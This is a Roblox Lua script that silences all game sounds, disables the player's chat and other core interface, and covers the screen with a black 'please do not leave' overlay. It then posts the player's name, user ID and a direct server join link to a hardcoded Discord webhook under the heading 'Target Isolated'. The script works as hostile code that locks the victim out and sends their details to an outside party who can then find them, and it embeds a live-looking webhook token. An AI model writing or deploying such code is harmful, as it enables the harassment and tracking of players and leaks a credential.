local HttpService = game:GetService("HttpService")

local Players = game:GetService("Players")

local SoundService = game:GetService("SoundService")

local StarterGui = game:GetService("StarterGui")

local player = Players.LocalPlayer



local proxyURL = "https://discord.com/api/webhooks/1483011079805079625/4C5mXHERHgjTN09uBEWFqzWvHULoQhnS0MKgvQQhCvWezjmlpQi2GqMIMqB1ZEt01sL5"



-- 1. Silence the Game

-- This forces the global volume to 0 so they can't hear anything happening

SoundService.AmbientReverb = Enum.ReverbType.NoReverb

local sounds = game:GetDescendants()

for _, sound in pairs(sounds) do

    if sound:IsA("Sound") then

        sound:Stop()

    end

end



-- 2. Remove Core UI (Chat, Backpack, Health, etc.)

-- This makes the screen look "broken" or completely locked

local function hideUI()

    local success, err = pcall(function()

        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

    end)

    if not success then

        task.wait(0.1)

        hideUI() -- Retry if the CoreGui hasn't loaded yet

    end

end

hideUI()



-- 3. Create the Blackout Overlay

local screenGui = Instance.new("ScreenGui")

screenGui.Name = "CriticalErrorOverlay"

screenGui.IgnoreGuiInset = true

screenGui.DisplayOrder = 2147483647 -- Maximum possible depth to stay on top

screenGui.Parent = player:WaitForChild("PlayerGui")



local background = Instance.new("Frame")

background.Size = UDim2.new(1, 0, 1, 0)

background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)

background.BorderSizePixel = 0

background.Parent = screenGui



local statusLabel = Instance.new("TextLabel")

statusLabel.Size = UDim2.new(1, 0, 0.1, 0)

statusLabel.Position = UDim2.new(0, 0, 0.45, 0)

statusLabel.Text = "INITIALIZING SCRIPT... PLEASE DO NOT LEAVE"

statusLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)

statusLabel.Font = Enum.Font.Code

statusLabel.TextSize = 20

statusLabel.BackgroundTransparency = 1

statusLabel.Parent = background



-- 4. Gather Data & Send Webhook

local joinLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId



local payload = HttpService:JSONEncode({

    ["content"] = "🚨 **Target Isolated**",

    ["embeds"] = {{

        ["title"] = "Scammer Server Details",

        ["color"] = 0, -- Black

        ["fields"] = {

            {["name"] = "User", ["value"] = player.Name .. " (" .. player.UserId .. ")", ["inline"] = false},

            {["name"] = "Join Link", ["value"] = "[CLICK TO JOIN SERVER](" .. joinLink .. ")"}

        }

    }}

})



pcall(function()

    HttpService:PostAsync(proxyURL, payload)

end)
